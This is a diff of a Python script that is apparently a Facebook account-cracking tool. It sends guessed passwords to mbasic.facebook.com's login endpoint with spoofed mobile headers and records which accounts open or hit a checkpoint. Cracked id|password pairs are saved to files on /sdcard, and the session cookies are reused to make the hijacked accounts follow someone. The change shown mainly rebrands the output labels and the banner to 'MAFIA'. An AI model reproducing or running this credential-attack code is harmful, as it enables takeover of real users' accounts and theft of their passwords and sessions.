@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [MMS-Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [MAFIA-Ok] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [MMS-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [MAFIA-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/MMS-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MAFIA-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -403,7 +403,7 @@ logo ="""
 \033[1;32m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆>>>\033[1;31m»»\033[1;32mMAFIA REYESS✓✓               
 \033[1;97m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋>>>\033[1;97m»»\033[1;97m+93783361438✓✓
 \033[1;32m𝙂𝙄𝙏𝙃𝙐𝘽>>>>>>>\033[1;31m»»\033[1;31mCrimanl313✓✓
-\033[1;31m𝙑𝙄𝙍𝙎𝙊𝙉>>>>>>>\033[1;31m»»\033[1;32m12.1✓✓   
+\033[1;31m𝙑𝙄𝙍𝙎𝙊𝙉>>>>>>>\033[1;31m»»\033[1;32m9.9✓✓   
 \033[1;32m𝙏𝙊𝙊𝙇 𝙎𝙏𝙐𝙏𝘼𝙎>>>>\033[1;31m»»\033[1;32m𝙁𝙍𝙀𝙀✓✓
 \033[1;35m𝙏𝙀𝙍𝙈𝙐𝙓 𝘼𝙇𝙇 𝙒𝙊𝙍𝙆𝙄𝙉𝙂 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 𝘽𝙔 MAFIA ✓✓
 \033[1;32m««««««««««««««««««««««««««««««««««««««««««««««««"""
